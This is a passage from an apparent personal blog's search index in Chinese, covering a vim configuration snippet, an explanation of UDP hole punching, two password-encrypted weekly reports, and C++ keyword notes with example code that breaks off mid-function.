&quot;在处理未保存或只读文件的时候，弹出确认cmap w!! w !sudo tee &gt; /dev/null %&quot;退出再次打开,光标回到原来的位置if has(&quot;autocmd&quot;)           au BufReadPost * if line(&quot;&#x27;\\&quot;&quot;) &gt; 1 &amp;&amp; line(&quot;&#x27;\\&quot;&quot;) &lt;= line(&quot;$&quot;) | exe &quot;normal! g&#x27;\\&quot;&quot; | endifendif\n\n","categories":["env"],"tags":["linux"]},{"title":"实现UDP打洞问题","url":"/2020/03/24/cs/udp%E6%89%93%E6%B4%9E/","content":"UDP打洞问题UDP打洞的过程大致如此：1、双方都通过UDP与服务器通讯后，网关默认就是做了一个外网IP和端口号 与你内网IP与端口号的映射，这个无需设置的，服务器也不需要知道客户的真正内网IP2、用户A先通过服务器知道用户B的外网地址与端口3、用户A向用户B的外网地址与端口发送消息，4、在这一次发送中，用户B的网关会拒收这条消息，因为它的映射中并没有这条规则。5、但是用户A的网关就会增加了一条允许规则，允许接收从B发送过来的消息6、服务器要求用户B发送一个消息到用户A的外网IP与端口号7、用户B发送一条消息，这时用户A就可以接收到B的消息，而且网关B也增加了允许规则8、之后，由于网关A与网关B都增加了允许规则，所以A与B都可以向对方的外网IP和端口号发送消息\n","categories":["cs"],"tags":["network"]},{"title":"2020-03-16 周报","url":"/2020/03/16/life/weekly/2020-03-16-%E5%91%A8%E6%8A%A5/","content":"\n  69d01b89b9601e5c57b37cfc1411681a1f21976d1d4b0aa15d31e1e10e338977675f9e49c4c4a944d9df6d3c320116e80d49e660df0b0d9a944a4aebc7c7c9bf53a874988b2dbe5485e73f331a70a14338cf0068547f161f0a24b3b0c8a950aa863410b46c000cb8eb7897db454c6e4320790c66b305dbd1313f0e519d6192567094cde08f31feb4ad2d7166f23724beabcad410fe6ea6081ef89bb2f7dfbd997f35014ebf6f447dee7c16e7ff4cc7b9507da45728dc2609f0ec4b3891e6d9420fe7d181920fec766e4cbacbf09cb89d18ac5eec9bba2a0cb03fb58fea735fab980a719519f68e8446cdb44b57415fa1822888fe7eb958bceacbc1d29308c1d6daf8bb14a671ab097619dfb123688e4a7f043c57e789bf3a5797c3ddcbdebac439267162530fd0272104fc142288534387d4e624eda8cb2cedcfea1b77df0b1901682b479f1c834bbac0aedeed3d8a368b0c3ce6d6ec9e6fe4cf99537fa155b7e9bf5723341c87435da39b95ebe988408f235acbaab8b0f3bec51d400cbbc01e0f0e0616484604fb295473edac85f26621862a3d9b4ae185d204409f531a348ce0765d51671cd3c203fcdfd09cfe68918b47d233ebf20edaf6bcc1132fe46fb2f0a564d1e1c20d30ca36fa9c9dd6c27e4bc69bc9eded1cf56188658f6da14ae7e6a0edeb0caba85a1940e38db58bd3edb3297e127f382cca3512382fe23d6786ba930a82d54671acda12cc664d665b2c34329dce08301bbe12ec2a09984764549d59bc72371587be5ddd8648c05758f2fbb25cd64ec2fc7745de5b396380370f984b1f807e4e06cbfb7faee697e72222d0f36002b0494691e2fa2f2e0f8460a1296e50292f4c2d632dedb4c0ac53ed78b65deb94a3798dfa59ab1adcc7ea9238993c79121814967696bdd8738091fe086dfae71d297cb3ddb310e7f377bf8c494ac6dbb4b5b280aa098c8acf456e84ac85b09a3d9b5568a48f3a9ef695ec76cb75b47ded498e7a65e0f26313cb315cdc4fd90424123c35a9e5e2640e126978cb0775bb680235e977f4f230310df6302afae36e96b9cae912818ac0583646988e4388372875168a1d2edc6a8bcad7c35e7e85e175676561a6f3567208c003b93e66cadf203bf22cb8ef367b70b0535ac59b71aaad8d6b11b89ba979117b4ac333eb99e5144e5f04e31c0c53d6fe4865020bf25358658b4d2dc8975b5c731603e5b0d48a0b72ed8095f3a98754d48ccc3a69b1a4248233f141843ed9fa899ea4cd5b1f05342c8c5c3be1d631d4616d7d5a13c089d62b036525099ac3c586497245196d7768cb9c21f8baa7ab6782148a2e9c13a8c007072aa3a4d9e5380601bf3c752ae1aec75b0fb8cddb4f40148770ddc295b36d52fa28d5364955815f87eb37a48b9952a3c3b768e1b9c21616c93a0147f8b71beb8b1e20dcd64cfc07bed47493dc0b6fb65f693bf43f5421443282453d93c3a29bc435cc44e9f089b260e59e44706fb4c8f1614749232295f12c7f25761ce3a1e059c830dd2bb58f98ad1f239c8edb262408dd6e4c6b4ddf5b3e7887ac3d971747c43700c649bb50b7e84f1a50c693815dc1182dbf17e6b5f7b3af3c05d9546e84a2dfbc202d47f9fe7e66ace17dd1f97eb6be89e891bbd2f5e8939136f11c6cd1f79f952236b458a219d08298cac00e46be14ed84e91b40b1ec32c44474affe8dd49099c4b1a797f6658c88975044cbcb7cd27f8ae6a941b23fa39b7761c13a69276217015f047b59ef0eb259f18f890bf5b168ebe17cb50d443783b5453ca8536da10906e7c8078e59dbff042f84a9d9d85fbb821624a7a73a6a1d829ec291a55142721e29dd0a465d41eb0d48b94a08a9fab0fe1b1351231a054a5b3891dc99297c090c2d4b5a32f15fecd26524cf9a9b1ad1197db75c4479f3c582b48240bf70087bbfe2407a35bab61fe1578779308939e9780d214295a2b8fa78bb869c7c0e00e38f6bfa4a320002ffbe903265597ca58258f4a558c328b00b2138d76d14b3086bccfb9e4a5c92be9ba1fbd6a283d3ae365fc8f3bf7e20dc53177fbb36d7da8a965480873b1b9b3ebc2f1fc0c8cbf3250e85dbfe42793961836cc585b638daa4411f7e3e0aa1a09df321daf5a579c36a900d43623264fbc57c334e013d2618154a14778e968055cd7365dcb9f5832d69d7330fe50391f6720e326df7bb0c89e932634578891335d93e0c61db7048966102f6ef414f3a35a3e8c8588b34512e07df1524433334ffd6469416ab2dbe1e909e2206a2d45a18b123655c853b4b829bde5df2656e82d5f0c918a4fb0fbf8ae41214cefdf0c5db763443371e24162c123098fd364329b9227833eab767f819a0bc12f297aa5842b7745ed4f6f0d01d75c82c9654d4d27887870936885def0281cc26974358d77702fc8d2fd49ab7bf0f8d571fbf0bd6f013cc1c25099adb6c387937c3ab6fb1c448703c6aa230d5a354271d77c68cc796a126018a5dc8cabb3ed70a488a6285b09afe7bf5787f02af657160cdb224b5463288076dd913b4ffd27b5657a48054f5b82584f9eff8cbe98760cd4e9a4f0498ff2a8ac74341e25cffc7fb47f2b9d5e815d46418e70e8f7370750942bdce2282422906bb58944162727da6160c7704147160e15672a787e09ee3c2dc09dec40b61c9c94e5a42e1d2175135234eb8444ad71f6cccef915e559e8c699d5ef87eeea1bdfdbfe2ec6cbc1f26ff6096f0d7d10b612d9cede02ff934f1b04e7e169d7a82aa8b08e9c1c8445c072a1992c5b82a13ad27a4b96a3770e4fcf57ecce8ccb76d3b1195f8a3667198ee279ca6d4895bc0167d577e9d6ad2c19ae9bf704fece8ac38df35e5afc0f526338565cb067b598c767a395a8907ca9ef94eede8312091fdd377277867be2cac4114c236cd6c319c8db93575b9fde6f7068ac4c0cf27752bcb19f3354c0ca58391f14e04631aa1dac353742e2479c5a236ad6fedd35c89170332036c570de3567e1a52870ccfd7f8e2abadde43c8e6e111e275f145fa708318a745a2b8c1d6aa10c184e04b3bd10fbb08e7c0c6e3f306c649aba110cfd6b08203979fd9ed7c27510719936133bc9d73d779db6848f8561d437d678b3459c13801e3b94603ee46049ed2a7e0975de618ce3718bde3f6c76d6297e5671c8a165e9e354b96885f43299db985390048d40950d18700890486d6fc9047b245dbb38084473f0841cb5ed5232073f651c450bbcfc4ec12a913d39270a58ca757adf61af403823ed0d326c4e743b5643cb00a5d081d0673cadc816b77e81ddc1bc2f47f894464bd6e7dba36b7cd2037a238154a51c56669df086b3d64694b2b959bdb2b7700ce0a78c7c2108786bce4f6b619c389409d64620e538ffb2da49f6ed25dd5da6a4d042aaeda4cafbc529968e0c6d7ba4089caaa6d82a36c09b7e6f0a403dcfab044b97fe52576d06223eb1db1eb7bb7f9adfe6767a71d7472e1841f328dbac77152ee1065d0198b40b3e1c1e4a71c119e39337f792e5a5d0d37463303ccadd361ecc76d7a121c123687a7d385e8d9fc59c7b37ad6787b6d3c865262cd8dcd8176160f183585da98a9e74d9861e26e9d58d980096fcd3a038f8d9bcdd47ae4d5a406751c47dd36e2212ab864bc660a8a059b149e83944f0115046d86fb715f6cfc9df91952366bede95d880f82f50ce014ba615884f7939c2c5549942aba076b9dd8ff26ed687a6188fd219ce7c403f84cc75095cbbdd5e5b8fd4f085982f4b120fe58d689eae3b755d81e31a4d10f0ec4b5aba620b268ed706ee56fca9840dacf04455d1e297940a451e99b926cac057720e9c54bf22a39f2d993e9a3e850ff6dcaa9082e68b5e733e146e5a089ff62ba6c008b009a185641b1e354c7053215113e00376331b6d4bd72d94eaad44708ee296f714b2c4cc9cbe23acbbcc2ca3b4882fc9b5fff82698c7e4f901fa928929907a552d08c0b40b216195d2cae22509c1f3c3fb06531335ee397868c8ba937a11fb5013893476b15045bdf7f1ee92c7ed364ff071b42d4ef6abf040ab71fe7f93049784d68182c7e5dcb7b8189e89b1c5f13f21a8579d2791e651bce8f5e181f463909c6ce0a49f1c2a810db67306589c099e223579f24097204127b69b75edbec4f7fc1d317a8af99bfddcc1e56839be14b58457920d89f98b6aa92a7a380c5cfdd4836ec9fadb4cfca9f36a776278f690a479ed403cd4de116910f4554dedd4ef590108fc2612180e4d2ac6681f90fccfe0411ebff5fc8e06fb9764daf9c9ae919f88427224e87ee25e2794c786ae0328d72fb915a788238e6a9be942b6dd1677a61ae2fcd93e72303a8d581056fffac3cb42f2e5648e72e67393b19d60d20526ae14817bdc26e2665a0460132ef1d88a8a77624a670bd42cc41a1a55618240e6c15907ec0714bec495709d7552f1d1aa4948469f69569966878769383524d420382a826189306294de8ed773741b5004d724d82e8d3c3ee5b790291d1c925aa1e76aecb6f67f95aef95ad9e4c3db4bcbe9df89196a2658610802699de4617dd51721440e1ed56f5930cccf5d20a2d79dafd2d979650b179e37dbca3365f22050a2f3f8e9c7bc4c85fdfd582dd01c369a9ce0bfd249cfff480786ff056e61057c7ecc03bed18280c924ce2e4040947061f6946c0354c172bdb2963d9a7d92d511b84841bcb6da3d124c7084a863b829dcfdb4f4358a4dbb032e7e906e4a7b4b139d36791616fa8dae1c129a4506d27a11230ea2091d6f767f856b3a3afef9ed26a6ed18043dd3398c47649cd9b46bbc9f4e06dd5a5bff6830e70bf51c8c55048070981df08b96a2979daad970e7831774a97f30cca5d1a0f7d3bcdd4aeea1adb15f0fba704e736e34c00ab7b965326b17524251efce39900a30853ec8906a183bcce38ff38dcfe21ead1db3bc3cecb04472efeb1528a0f8c7c17213d782c8d1b13da991d60597cd1ea316fcf6a0293909ce4a319c8c124d08a56879d61ab359d68f149c98b169bc594651f1d2b4fad6fe3614460441233c3cc8fc79307fa257ec6cbddc7eb2ee113f37148af399a249e6e2799b714e105ad7a4ff4b68359ad4d59735909f6518dc96b790186991cadf9047c7bdf8a779dc95c278d757fde7b8d3ab9c6ab37c1adb0e94e897f73442503cee1bc6b4428f7aa26ba8edcf41431a5d3665c36b308986ad13d294178b07fa00de548b2de882e4ac4c804dafbafdafb17f2649c251a7f5601df4be0aa584dbf8cbb5268cb3df44ffc522449f31704a460b392798343452bcaf4c857aaf267bd1c74c5cb8150f150cf954291956787d46f7e4d04006040ac364dd2343c0a7fb602220ad47df25e5792f1f8c30992a94aa45197f6998e5e9232d0e2b241cc341aaad70f5a7e93c4d0903abf5b91a98a38d7bdc4ce9a0b83027b24450b785afc1340563bce87cd58d196f696904e650682ccaadd5d1253387bb8f9b0eb48d75143c16fa9673cc9a60ced9e51bc4adbfe034c2d0f09c5bba55c782c914875afe578b73015b624fff59c815245e502e4996fbea741a02b31b14bb3ced323bb719ba378eb352dcc01611f6cdf27f127c4d214e1e54901dafa897be8e368f4aa6a77daefb41eaee78ae88ae6b339a23d8cb2c54f21f0f0603904813177078abceea89710de7710b17f2b10087ce1bb170fdbb6f626e15b796c2ce5b34a4a1b0aadd1e4116817c8741a8e87ffd3b67a269bddb8961f2b08ab749447eefdb28f7d70421e845b8869de76bad9469db2848a2cbd6f97792a9d31d7cf7fd790321372a2d6f5cc3cb3b6bbfcd9237c0aaa0174f2f1536818387d7ad63660d50e326838a0a6762011ab86d67116f7375d142e36fae888a409440f9ee9058c3b5ce22855fd5d9e933bf410e104b1a576248abff2d04e5dc0bf1692dcb31634696d9a53018ac36ae8c58ea13e7360506f3adbb76eda85bff4300e44ac6c57ccf3b58c59409b788f01b4da5ca8be39f9646c055f6351e7f9559ea90ef8c08086d6643fd61de5844759551a5dbe41316380dd5c0f921ae0b2080c3e4bd370a7a7eb3a1d8418de742da53656dbf1a220188c3cb7a236d58167b04c49d2ed84cec3db0a8f648794f4267bcd80cac98a4f2a82d60a8f26fc5d598e90b1a5e79df64b7e555cbf465e1ec1eac0c3248e84208833fd6ba0a5b2edbe34f8b69907bd919b30eedc2dbb7f26d9a8e8488d3593d9fdc4b20e5b06c66a261e690d78230e496387edac72052844af0ddda1542c4b50af5055563d9d492bd9fe2f257ac762a1e6c119a33daf72403ffa545699c6471f368d31c41a53ee8060a9fcc296678d6492427e81ac165226505b4b1064d9c066e0dda7575a89046ed3754f88cbe9000985d58d65f0cecde805ac5dec8508a8610f0816f4f287000134665b6c7ae006d6e7d141771a9bddebccbc1d349975028f755366e6381d671f0338973bfa6114c5d40f64ff1c669cca5556ada98cc969060def3b361464bf77aa82dd861a3c5e3e7390bef18eae8b62d043834200e6599e2b9c9061f87dfc2321f8d8f761d9b483f319c7fe41e1f965ee650e709394a510f2b67a25acd4a342af99fd37a44391666e8efaadc8ac25979bd5b2371f2625ecbc2d6b00e87e8c09fd8852470282b68e323eb9fd418e20642efa77435735de66ffe04c5baac56dad64d1af0583b29a9f6d749f2247dcb473f92a9cf5444093e533b633c8b75281cf7f34f511e42139f1180d67ac18580e836de62181cf37811a38b0a5058445c618ad1170e90be162795839f4f34667ef6670294aa7a92eecb974836fb1cdbec45bb1fe1355a1d03f84593da7fdaf959b0f6f81c1ef906efef64564a41058e8c35f15ba9fdcda9744f6bdb2a9e3508feb466afc8626b9b001dafc1eccf8987fe6bec548a7c2410ce08858bb4b2aae24db586fe2462f567b7a9f54eece20578d6f22dfad427709efe5fdbd30caf6e34ed07e2a17c4a10650d06df5b9a66214d75cc3eaa1b09d510b5bc2627fda604b6e6d0ac9a55b59be435edc0a63b09bb941a6f70ab09ed3b6e72b23ce4f2510ed6fc79ca87e40fff0114cdbefb4e95a23f606d63df99da6e1c0457932d96c26446116a06effb986518ed34ddaf4fb48af17b7182531b3a112dcb620cbf76af349571a2d75e12ce71f1fdf24c1bc6d9a99b78d227139d32898ed9fcf4c548f37b10639db2ecd45b4ffa832a5954d3617427e82c82b6852ecbdfea3db7aa366bd5583102f5729019820b1a4fd544bd95f38e7376e235dea847479b3185b8591a715fc38cf4b96c94a5012a0797613f5bc8cfce003aa2494a9ce717ed3e3609609393cd959d13bb866892c0048874e35c9a544879098e1936a85651915165ee45159a06e1a01aa7c7cad20a7d1f5ec7510c1b0524210c8e80e53ccb9c25400a7dd9e5ef404384d7f4f4327eabb9a1fc1eff6e3785e6843113046ee9c13b1e4b6e2587546464772ed9951630b6612babecc9678c685f86af3eeb8659c83d72f36df99daf9492a59bf6efa05b28cf7e0be82f49a1674a26eea7aae24459a6fc897441f0e52e5903fe778be76538ee0480a6af4210e89764ff517e31b6a56a9a9a49c36f8a7a02caaf2f27bbe427de251780816b86a9d5c4d32a36783f957382922e44afbb42e20f52bd606625567768da870c2664c7b5adb92ceab1d2aa7c9810274bfb369108caaf0f5a73a0ff6a6a5347f59502eb63dbe649e67d94f43c4fcb4d1dcc36d0d34998adc7cedb0b27b9c4ee7c78e9c0d4cc86533784c16da1430fd41b15d1054461f728955b6797d975201042aa87a1d05ab08439e4bafd293805c5e6dfde4ea776d92eae151e844e43209eaebe60d1ba76a754cfda674fa0ed09f92318630fc229bd1988747209201b6de2991594ab41a4f63104d21018d9b0c35a7450e5eece13a6682e9c85dec12f7cb3fdde4\n  \n    \n      \n      \n        请输入与 Rhodes Island™ 取得弱神经连接时的口令：\n      \n    \n  \n\n","categories":["life"],"tags":["life"]},{"title":"2020-03-08 周报","url":"/2020/03/08/life/weekly/2021-03-28-%E5%91%A8%E6%8A%A5/","content":"\n  69d01b89b9601e5c57b37cfc1411681a1f21976d1d4b0aa15d31e1e10e3389778670a09bdc0f7c47f10d8161d6c2927b8d2d2e887957fa4d11256b89d11d59f4b11da0eaa4a593f7e1d3e5f39ebe2823d3603ff537a827689f02e61a3384f57e2e87354349b35b6ac4fd911d0d44a27f11e24d5973b097c5134625c91433a6a99a06796cac1cfeb008ceef0c8680fac43e1fad14839603cdf680383e754d79359cc6a5bfacad16a93a188859c64d43e5de8cd4f5f155f46b934becee39932e7c4c911d401da2a16e6dec008ae552a7202916939de8ed175826afe27cbdd4f40d8fc411117b0aa12d71ef17d122d6bad46d505c93ad7d976748c2485975961bd112158f153e1753320fe9388269c601ac906d8ec931317cc91b02a2e7fffbaba7353e54f6d3bbdf07fd82d8f505f68b40ce4011624cd6a13943b8ddcb26d9badcd96377862080e99fcf7581f0fb6fb5c07a306d8b44b34cbfd7d5d925bb305fa14d9aea20376e55d41d1ecb7c2b5b1f94ef582955257ba79b54a84f0793bbe2d0aa751c9affe34008b3d8bd663cabd278e86dd3da17f8c40b2ca3a1357221d37cc63aa9471435aea65248356af15da74950c6ccd548498742ac073b05d104487888708bc8a30df9bfc600b785179b4e31ca2fece88ab5665b2ac3120b5388d4ea399824090bd7b934d455597cdfb3b88e9b27bf582e6af1b6c48bee1e4883b157c092061bc8f9a5b59590dc7cb0c2fa215f2f8deb9b5205610da48b2e76216a1bf69117235237f47807139a6e3a9d487c0c7dbe2715fa93463037aa1ad5f4fbc9f8e7849659bb445bddd456008d6a266657a33cd0e3526ebd488df0e18a4ac4ce0b5014f7ee94842ff59a023d53c2160e265e8ed8bc07689c2cfa31c2c79eee02d4affd338e32670bf9b777aaf6b89e3aa7acf52a220d170f244e19875d1c72414fd480192d51ad7b6c4853b7b1c6d98c5d2b20678f39d3cf8b965fd7a838fc53344f995c712c6635b8bc29e6590b5eab70b650463ae67d461a5c6dfc619f0d1cb637a5ac9a1bf193c50058e52ac402a8e0ca069ae1626a54fae5c033eddd5c25c0c4eabb4a487111b66022db629a325a4a4770c5bb1ac52807870515aee0377a\n  \n    \n      \n      \n        请输入与 Rhodes Island™ 取得弱神经连接时的口令：\n      \n    \n  \n\n","categories":["life"],"tags":["life"]},{"title":"C++ Language","url":"/2020/02/24/dev/language/cpp/cpp/","content":"C++ languageLearn：\nhttps://www.programiz.com/cpp-programming/variables-literals\nKeywords of C++alignas(c++11)\t //声明结构体或类的对齐数\nalignof(c++11)\t //查看结构体或类的对齐数\nand\t\t\t\t //等价于 &amp;&amp;\nand_eq\t\t\t //等价于 &amp;&amp;=\nasm\t\t\t\t //汇编语句\nauto\t\t\t //自动类型\nbitand\t\t\t //等价于  &amp;\nbitor\t\t\t //等价于　|\nbool\t\t\t //bool类型\nbreak\t\t\t //跳出当前循环,或switch\ncase\t\t\t //结合switch使用\ncatch\t\t\t //捕获异常\nchar\t\t\t //1字节变量\nshort\t\t\t //2字节变量\nsigned\t\t\t //声明为有符号类型\nunsigned\t\t //声明为无符号类型\nchar16_t(c++11)  //常使用于Unicode字符\nchar32_t(c++11)\t //常使用于Unicode字符\nint\t\t\t\t //默认４字节\nlong\t\t\t //不比int类型小的类型\nclass\t\t\t //类,或者声明模板类型\ncompl\t\t\t //等价于 ~\nconcept(概念Ts)\t //专家级别使用\nconst\t\t\t //声明常变量\nconstexpr(c++11) //用作函数时,是在编译是进行函数调用的,类似与宏\nconst_cast\t\t //常变量强制转化为其他变量类型\ncontinue\t\t //结合循环来使用\t\ndecltype(c++11)  //与auto差不多,可以用于某个不确定多个参数类型的模板函数\ndefault\t\t\t //结合switch来使用\ndelete\t\t\t //释放new出来的东西\nnew\t\t\t\t //开辟内存\ndo\t\t\t\t //配合 while构成循环\nexplicit\t\t //不能隐式构造\nexport\t\t\t //专家级别使用...\nextern\t\t\t //改变某个变量的作用域,常用在不同文件中使用同一个变量\nfloat\t\t\t //4字节的浮点类型\ndouble\t\t\t //８字节的浮点类型\nfor\t\t\t\t //for循环\ngoto\t\t\t //跳转\nif\t\t\t\t //判断\nfriend\t\t\t //给类中的一些函数使用,可以访问类中的私有成员变量\ninline\t\t\t //内联声明, 编译器对该函数进行优化,类中函数和模板函数默认代这个参数\nmutable\t\t\t //在lambda表达式中使用表示为传递进来的变量可以被赋值\nnamespace\t\t //声明命名空间　\nnoexcept(c++11)  //声明为不抛出异常,利于编译器的优化 \nnot\t\t\t\t //等价与 !\nnot_eq\t\t\t //等价于 !=\nnullptr(c++11)\t //c++11以后声明空指针类型,主要解决模板函数中的参数问题\noperator\t\t //操作运算重载\nor\t\t\t\t //等价与 |\nor_eq\t\t\t //等价于 |=\nprivate\t\t\t //声明成员为私有的\npublic\t\t\t //声明成员为公共的\nprotected\t\t //声明成员为保护的\nregister\t\t //声明在寄存器里的变量\nreinterpret_cast //常用在　一个类型的指针转化为另一个类型的指针\nrequires(概念TS) //一个概念,目前还没有编译器实现\nreturn\t //函数的返回\nstatic\t //声明变量为静态的\nsizeof\t //获取某个变量的大小\nstatic_assert(c++11) //静态断言, 常用\nstatic_cast //静态转化\nstruct\t //结构体类型\nswitch\t //switch分支判断结构\ntemplate //声明模板\nthis\t //this指针, 常用在class和struct\nthread_local(c++11)  //结合线程来使用\nthrow\t //抛出异常\ntrue\t //bool类型的真\nfalse\t //bool类型的假\ntry\t\t //异常尝试\ntypedef\t //改变变量名称\ntypeid\t //获取类型的id号\ntypename //声明模板类型\nunion\t//联合体\nusing  //可以替换typedef的功能\nvirtual //虚函数\nvoid   //空类型\nvolatile //直接声明为定死的常量\nwchar_t //表示宽字符的\nwhile   //循环\nxor\t\t//异或 ^\nxor_eq  //　^=\n\n实例\n#include &lt;iostream&gt;#include &lt;typeinfo&gt;#include &lt;cassert&gt;#include &lt;map&gt;//#include &lt;algorithm&gt;//#include &lt;vector&gt;//#include &lt;list&gt;//#include &lt;stack&gt;//#include &lt;future&gt;//#include &lt;functional&gt;using namespace std;//---------------------------------------------------------------//alignasstruct alignas(8) S &#123;&#125;;struct alignas(1) U &#123;S s; &#125;; //badstruct Foo &#123;\tint i;\tfloat f;\tchar c;&#125;;struct Empty &#123;&#125;;struct alignas(64) Empty64 &#123;&#125;;struct alignas(1) Double &#123; double d; &#125;;struct Obj &#123;char a; int b;&#125;;//sizeof(Obj) == 8//alignof(Obj) == 4void alignInfo() &#123;\tcout &lt;&lt; &quot;Alignment of&quot; &lt;&lt; endl\t\t&lt;&lt;&quot;_char\t\t\t : &quot; &lt;&lt; alignof(char) &lt;&lt; endl\t\t&lt;&lt;&quot;_pointer          : &quot; &lt;&lt; alignof(int*) &lt;&lt; endl\t\t&lt;&lt;&quot;_class Foo        : &quot; &lt;&lt; alignof(Foo) &lt;&lt; endl;&#125;//---------------------------------------------------------------//andvoid showAnd() &#123;\tint a = 3;\tint b = 4;\tif(a == 3 &amp;&amp; b == 4) &#123;\t\tcout &lt;&lt; &quot;&amp;&amp; a = 3, b = 4&quot;;\t&#125;\tif(a == 3 and b == 4) &#123;\t\tcout &lt;&lt; &quot;and a = 3, b = 4&quot;;\t&#125;&#125;//---------------------------------------------------------------//and_eq   &lt;=&gt;  &amp;=void testAnd_eq() &#123;\tbool a = false;\tbool b = true;\tb = b and_eq a;\tcout &lt;&lt; b &lt;&lt; endl;\tbool c = true;\tc and_eq a;\tcout &lt;&lt; &quot;c: &quot; &lt;&lt; c &lt;&lt; endl;&#125;//---------------------------------------------------------------//not &lt;=&gt; !void testNot() &#123;\tbool a = true;\t\tbool b = not(a);\tcout &lt;&lt; b;&#125;//---------------------------------------------------------------//not_eq &lt;=&gt; !=void testNot_eq() &#123;\tbool a = true;\ta not_eq(a);\tcout &lt;&lt; a;&#125;//---------------------------------------------------------------//or &lt;=&gt; |void testOr() &#123;\tint a = 3;\tcout &lt;&lt; a or 2;&#125;//---------------------------------------------------------------//or &lt;=&gt; |=void testOr_eq() &#123;\tint a = 3;\ta or_eq 4;\tcout &lt;&lt; a;&#125;//---------------------------------------------------------------void showAsm() &#123;\tasm (\t&quot;movq $60, %rax\\n\\t&quot; //the exit syscall number on linux\t&quot;movq $2,  %rdi\\n\\t&quot; //this program returns 2\t&quot;syscall&quot;\t);&#125;//---------------------------------------------------------------int get_fun(int x) &#123;\treturn x + 1;&#125;double add(double a, double b) &#123;\treturn a + b;&#125;void showAuto() &#123;\tauto a = 1 + 2;\tcout &lt;&lt; &quot;type of a: &quot; &lt;&lt; typeid(a).name() &lt;&lt; endl;\tauto b = add(1, 1.2);\tcout &lt;&lt; &quot;type of b: &quot; &lt;&lt; typeid(b).name() &lt;&lt; endl;\tauto c = &#123;1, 2&#125;; //初始化列表\tcout &lt;&lt; &quot;type of c: &quot; &lt;&lt; typeid(c).name() &lt;&lt; endl;\tauto my_lambda = [](int x) &#123; return x + 3; &#125;;\tcout &lt;&lt; &quot;type of my_lambda: &quot; &lt;&lt; typeid(my_lambda).name() &lt;&lt; endl;\tauto my_fun = get_fun;\tcout &lt;&lt; &quot;my_fun: &quot; &lt;&lt; my_fun(3) &lt;&lt; endl;\tcout &lt;&lt; &quot;type of my_fun: &quot; &lt;&lt; typeid(my_fun).name() &lt;&lt; endl;&#125;//---------------------------------------------------------------void showBitAndOr() &#123;\tauto a = 3l; //long int\tauto b = 4;\tauto c = a bitand b;\tauto d = a bitor b;\tcout &lt;&lt; &quot;c: &quot; &lt;&lt; c &lt;&lt; &quot;d: &quot; &lt;&lt; d;&#125;//---------------------------------------------------------------void testBool() &#123;\tbool a = true;\tbool b = false;\t*(reinterpret_cast&lt;char *&gt;(&amp;a)) = -1;\tcout &lt;&lt; a &lt;&lt; &quot; &quot; &lt;&lt; b &lt;&lt; endl;\tif(a == true) &#123;\t\tcout &lt;&lt; &quot;i&#x27;m true&quot;;\t&#125;else if(a == false)&#123;\t\tcout &lt;&lt; &quot;i&#x27;m false&quot;;\t&#125;else &#123;\t\tcout &lt;&lt; &quot;What?&quot;;\t&#125;&#125;//---------------------------------------------------------------void testBreak() &#123;\tint a = 10;\tfor(;;) &#123;\t\tfor(;;) &#123;\t\t\t++a;\t\t\t\tif(a &gt; 1000) break;\t\t&#125;\t\t\tif(a &gt; 100000000) break;\t&#125;&#125;//---------------------------------------------------------------void testCompl() &#123;\tint a = -3;\tint b = compl(a); // compl(a) &lt;=&gt; ~a\tcout &lt;&lt; b;&#125;//---------------------------------------------------------------int fact(int n) &#123;\treturn n &lt; 1 ? 1 : (n * fact(n - 1));&#125;constexpr int factorial(int n) &#123;\treturn n &lt; 1 ? 1 : (n * factorial(n - 1));&#125;template&lt;int N&gt;struct NN&#123;\tvoid print() &#123; cout &lt;&lt; N &lt;&lt; endl;&#125;&#125;;void testConstExpr() &#123;\tauto a = fact(4); //运行时计算\tauto b = factorial(4); //编译时计算, 类似于宏定义计算\tcout &lt;&lt; &quot;a: &quot; &lt;&lt; a &lt;&lt; &quot; b: &quot; &lt;&lt; b &lt;&lt; endl;\tchar group[factorial(5)];\tNN&lt;factorial(8)&gt; nn;\tnn.print();&#125;//---------------------------------------------------------------/*void testThread(const int &amp;a) &#123;\tcout &lt;&lt; &quot;thread&quot;\t&#125;*/void testConst_cast() &#123;\tconst int i = 3;\t//const int*\tint *p = const_cast&lt;int*&gt;(&amp;i);//\tstd::thread aa([&amp;i]()&#123; testThread(i); &#125;);\t*p = 5;\tcout &lt;&lt; p &lt;&lt; endl &lt;&lt; &amp;i &lt;&lt; endl;\tcout &lt;&lt; i &lt;&lt; &quot;  &quot; &lt;&lt; *p &lt;&lt; endl;&#125;//---------------------------------------------------------------//decltype 与 auto 十分相近struct A &#123;A(int n) : x(n) &#123;&#125; double x;&#125;;void testDecltype() &#123;\tconst A* a = new A(0);\tauto aa = a-&gt;x;\tdecltype(a-&gt;x) y; // 相当于auto  aa = a-&gt;x\tdecltype((a-&gt;x)) z = y; //相当于 auto &amp; z = y, 引用\ty = 3;//\tz = 4;\tcout &lt;&lt; y &lt;&lt; endl &lt;&lt; z;&#125;// 写一个相加函数, 实现不确定类型相加的函数template&lt;typename T, typename U&gt;auto add(T a, U b) -&gt; decltype(a + b) &#123; //decltype(a + b) 推导出返回值类型\treturn a + b;&#125;/*//陷阱: auto template&lt;typename T, typename U&gt;auto add(Ta, Ub) &#123;&#125;\treturn a + b;\t// return a + b 与 return (a + b) 可能表示的意义不同, 后者可能代表引用&#125;*///---------------------------------------------------------------struct Base &#123; virtual ~Base() &#123;&#125; &#125;;struct Drive : Base &#123;\tvirtual void name() &#123;&#125;&#125;;void testDynamic_cast() &#123;\tBase *b1 = new Base;\t//这里会调用不成功\tif(Drive *d = dynamic_cast&lt;Drive *&gt;(b1)) &#123;\t\tstd::cout &lt;&lt; &quot;downcast from b1 to d successful&quot; &lt;&lt; std::endl;\t\t\td-&gt;name(); //safe to call\t&#125;\t\tBase *b2 = new Drive;\t//这里会调用成功\tif(Drive *d = dynamic_cast&lt;Drive *&gt;(b2)) &#123;\t\tstd::cout &lt;&lt; &quot;downcast from b2 to d successful&quot; &lt;&lt; std::endl;\t\t\td-&gt;name(); //safe to call\t&#125;\t//对于dynamic_cast转换引用,若转化失败,则会抛出异常\t//dynamic_cast 在运行期进行检查 \t/*\tBase bb; \tDrive&amp; cc = dynamic_cast&lt;Drive&amp;&gt;(bb);\t*/&#125;//---------------------------------------------------------------enum Color &#123; red, green, blue &#125;;//老的版本中,若出现 enmu Color2 &#123;red, green, blue&#125;; 就会出先重复的元素,就会报错void testOldEnum() &#123;\tColor r = red;\tswitch(r) &#123;\t\tcase red:\t\t\tstd::cout &lt;&lt; &quot;red&quot; &lt;&lt; std::endl;\t\tbreak;\t\tcase green:\t\t\tstd::cout 